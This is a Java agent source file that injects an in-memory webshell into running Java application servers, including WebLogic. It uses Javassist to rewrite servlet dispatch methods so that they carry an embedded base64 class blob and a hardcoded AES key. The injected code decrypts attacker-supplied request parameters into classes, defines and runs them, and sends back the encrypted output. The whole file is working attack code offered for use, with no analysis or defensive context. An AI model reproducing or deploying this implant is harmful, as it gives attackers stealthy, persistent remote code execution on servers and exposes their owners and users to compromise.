package xxxx;

import xxxx.javassist.*;

import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MyAgent {
    private static String key = "3c6e0b8a9c15224a";
    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        String[] ARGS = args.split(",");
        String servername = ARGS[0];
        String pass = ARGS[1];
        init(servername, pass, inst);
    }

    public static void premain(String args, Instrumentation inst) throws Exception {}

    public static void init(String serverName, String pass, Instrumentation inst){
        String md5Str = md5(pass + key);
        Class<?>[] cLasses = inst.getAllLoadedClasses();
        byte[] data = new byte[0];
        Map<String, Map<String, Object>> targetClasses = new HashMap<String, Map<String, Object>>();
        targetClasses = (Map<String, Map<String, Object>>) Constants.getTarget();

        ClassPool cPool = ClassPool.getDefault();
        if (serverName.equalsIgnoreCase("weblogic")) {
            targetClasses.clear();
            Map<String, Object> targetClassWeblogicMap = new HashMap<String, Object>();
            targetClassWeblogicMap.put("methodName", "execute");
            List<String> paramWeblogicClsStrList = new ArrayList<String>();
            paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
            paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
            targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);

            targetClassWeblogicMap = new HashMap<String, Object>();
            targetClassWeblogicMap.put("methodName", "wrapRun");
            paramWeblogicClsStrList = new ArrayList<String>();
            paramWeblogicClsStrList.add("weblogic.servlet.internal.ServletStub");
            paramWeblogicClsStrList.add("javax.servlet.http.HttpServletRequest");
            paramWeblogicClsStrList.add("javax.servlet.http.HttpServletResponse");
            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
            targetClasses.put("weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction", targetClassWeblogicMap);
        }
        String methodStr  =
                        "javax.servlet.http.HttpServletRequest req2 = (javax.servlet.http.HttpServletRequest){req};\n" +
                        "javax.servlet.http.HttpServletResponse resp2 = (javax.servlet.http.HttpServletResponse){resp};\n" +
                        "java.lang.Object payload = null;\n" +
                        "java.lang.Object b64 = null;\n" +
                        "java.lang.reflect.Method b64e = null;\n" +
                        "java.lang.reflect.Method b64d =null;\n" +
                        "java.lang.reflect.Method x = null;\n" +
                        "if(req2.getHeader(\"X-Requested-With\") != null && req2.getHeader(\"X-Requested-With\").indexOf(\"XMLHTTPRequest\") != -1){\n" +
                        "    javax.servlet.http.HttpSession session = req2.getSession();\n" +
                        "    try {\n" +
                        "        if (session.getAttribute(\"b64\")  == null) {\n" +
                        "            Class var3 = null;\n" +
                        "            try {\n" +
                        "                var3 = (Class)Thread.currentThread().getContextClassLoader().loadClass(\"memshell.B64\");\n" +
                        "            }catch (java.lang.Exception var5){\n" +
                        "                java.lang.reflect.Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[] { byte[].class, int.class, int.class });\n" +
                        "                var1.setAccessible(true);\n" +
                        "                byte[] var2 = new sun.misc.BASE64Decoder().decodeBuffer(\"yv66vgAAADMAdgoAFABDCABECgBFAEYHAEcIAEgKABUASQoABABKCgBFAEsKAEUATAcATQgATgoAEgBPCABQCgASAFEKAFIAUwoAFABUCABVBwBWBwAsBwBXBwBYCABZCgASAFoIAFsIAFwIAF0IAF4IAF8HAGABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxtZW1zaGVsbC9CNjQ7AQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAJbQgEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcAYAcAYQcATQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQASTGphdmEvbGFuZy9TdHJpbmc7BwBYAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAKU291cmNlRmlsZQEACEI2NC5qYXZhDAAeAB8BAANBRVMHAGEMAGIAYwEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABAzYzZlMGI4YTljMTUyMjRhDABkAGUMAB4AZgwAZwBoDABpAGoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS51dGlsLkJhc2U2NAwAawBsAQAKZ2V0RW5jb2RlcgwAbQBuBwBvDABwAHEMAHIAcwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAB0AHUBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEADG1lbXNoZWxsL0I2NAEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwAhAB0AFAAAAAAABAABAB4AHwABACAAAAAvAAEAAQAAAAUqtwABsQAAAAIAIQAAAAYAAQAAAAMAIgAAAAwAAQAAAAUAIwAkAAAAAQAlACYAAQAgAAAA1gAGAAQAAAAqEgK4AANOLRyZAAcEpwAEBbsABFkSBbYABhICtwAHtgAILSu2AAmwTgGwAAEAAAAmACcACgADACEAAAAWAAUAAAAGAAYABwAhAAgAJwAJACgACgAiAAAANAAFAAYAIQAnACgAAwAoAAIAKQAqAAMAAAAqACMAJAAAAAAAKgArACwAAQAAACoALQAuAAIALwAAADwAA/8ADwAEBwAwBwATAQcAMQABBwAx/wAAAAQHADAHABMBBwAxAAIHADEB/wAWAAMHADAHABMBAAEHADIACQAzADQAAgAgAAABRAAGAAUAAAByAU0SC7gADEwrEg0BtgAOKwG2AA9OLbYAEBIRBL0AElkDEhNTtgAOLQS9ABRZAypTtgAPwAAVTacAOU4SFrgADEwrtgAXOgQZBLYAEBIYBL0AElkDEhNTtgAOGQQEvQAUWQMqU7YAD8AAFU2nAAU6BCywAAIAAgA3ADoACgA7AGsAbgAKAAMAIQAAADIADAAAABAAAgASAAgAEwAVABQANwAcADoAFQA7ABcAQQAYAEcAGQBrABsAbgAaAHAAHQAiAAAASAAHABUAIgA1ADYAAwAIADIANwA4AAEARwAkADUANgAEAEEALQA3ADgAAQA7ADUAKQAqAAMAAAByADkALAAAAAIAcAA6ADsAAgAvAAAAKgAD/wA6AAMHABMABwA8AAEHADL/ADMABAcAEwAHADwHADIAAQcAMvoAAQA9AAAABAABAAoACQA+AD8AAgAgAAABSgAGAAUAAAB4AU0SC7gADEwrEhkBtgAOKwG2AA9OLbYAEBIaBL0AElkDEhVTtgAOLQS9ABRZAypTtgAPwAATwAATTacAPE4SG7gADEwrtgAXOgQZBLYAEBIcBL0AElkDEhVTtgAOGQQEvQAUWQMqU7YAD8AAE8AAE02nAAU6BCywAAIAAgA6AD0ACgA+AHEAdAAKAAMAIQAAADIADAAAACIAAgAkAAgAJQAVACYAOgAuAD0AJwA+ACkARAAqAEoAKwBxAC0AdAAsAHYALwAiAAAASAAHABUAJQBAADYAAwAIADUANwA4AAEASgAnAEAANgAEAEQAMAA3ADgAAQA+ADgAKQAqAAMAAAB4ADkAOwAAAAIAdgA6ACwAAgAvAAAAKgAD/wA9AAMHADwABwATAAEHADL/ADYABAcAPAAHABMHADIAAQcAMvoAAQA9AAAABAABAAoAAQBBAAAAAgBC\");\n" +
                        "                java.lang.ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
                        "                java.lang.Object[] aa = new java.lang.Object[]{var2, new java.lang.Integer(0), new java.lang.Integer(var2.length)};\n" +
                        "                var3 = (Class)var1.invoke(cl, aa);\n" +
                        "            }\n" +
                        "            session.setAttribute(\"b64\", var3);\n" +
                        "        }\n" +
                        "        b64 = ((Class)session.getAttribute(\"b64\")).newInstance();\n" +
                        "        b64e = b64.getClass().getMethod(\"base64Encode\", new Class[]{byte[].class});\n" +
                        "        b64d =  b64.getClass().getMethod(\"base64Decode\", new Class[]{String.class});\n" +
                        "        x =  b64.getClass().getMethod(\"x\", new Class[]{byte[].class, boolean.class});\n" +
                        "        byte[] da = (byte[]) b64d.invoke(b64, new Object[]{req2.getParameter(\"{pass}\")});\n" +
                        "        byte[] data = (byte[]) x.invoke(b64, new Object[]{da, new java.lang.Boolean(false)});\n" +
                        "        if (session.getAttribute(\"payload\")  == null) {\n" +
                        "            Class var4 = null;\n" +
                        "            try{\n" +
                        "                var4 = (Class)Thread.currentThread().getContextClassLoader().loadClass(\"payload\");\n" +
                        "            }catch (java.lang.Exception e){\n" +
                        "                java.lang.reflect.Method var5 = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[] { byte[].class, int.class, int.class });\n" +
                        "                var5.setAccessible(true);\n" +
                        "                var4 = (Class) var5.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{data,new Integer(0), new Integer(data.length)});\n" +
                        "\n" +
                        "            }\n" +
                        "            session.setAttribute(\"payload\", var4);\n" +
                        "        }else{\n" +
                        "            payload = ((Class)session.getAttribute(\"payload\")).newInstance();\n" +
                        "            req2.setAttribute(\"parameters\", new Object[]{data});\n" +
                        "            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
                        "            payload.equals(arrOut);\n" +
                        "            payload.equals(data);\n" +
                        "            resp2.getWriter().write(\"{md51}\");\n" +
                        "            payload.toString();\n" +
                        "            byte[] b = (byte[]) x.invoke(b64, new Object[]{arrOut.toByteArray(), new java.lang.Boolean(true)});\n" +
                        "            resp2.getWriter().write((String) b64e.invoke(b64,new Object[]{ b}));\n" +
                        "            resp2.getWriter().write(\"{md52}\");\n" +
                        "        }\n" +
                        "    } catch (java.lang.Exception r) {\n" +
                        "\n" +
                        "    }\n" +
                        "return;}";

        methodStr = methodStr.replace("{md51}", md5Str.substring(0,16)).replace("{md52}", md5Str.substring(16));
        methodStr = methodStr.replace("{pass}", pass);
        for (Class<?> cls : cLasses) {
            if (targetClasses.keySet().contains(cls.getName())) {
                String targetClassName = cls.getName();
                String shellcode = methodStr;
                try {
                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet"))
                        shellcode = methodStr.replace("javax.servlet", "jakarta.servlet");
                    List<String> p = Constants.getParams(targetClassName);
                    shellcode = shellcode.replace("{req}", p.get(0)).replace("{resp}", p.get(1));
                    ClassClassPath classPath = new ClassClassPath(cls);
                    cPool.insertClassPath((ClassPath)classPath);
                    List<CtClass> paramClsList = new ArrayList<CtClass>();
                    for (Object clsName : (List)((Map)targetClasses.get(targetClassName)).get("paramList"))
                        paramClsList.add(cPool.get((String) clsName));
                    CtClass cClass = cPool.get(targetClassName);
                    String methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, paramClsList.<CtClass>toArray(new CtClass[paramClsList.size()]));
                    cMethod.insertBefore(shellcode);
                    cClass.detach();
                    data = cClass.toBytecode();
                    inst.redefineClasses(new ClassDefinition[] { new ClassDefinition(cls, data) });
                } catch (Exception e) {
                    e.printStackTrace();
                } catch (Error error) {
                    error.printStackTrace();
                }
            }
        }
    }
}
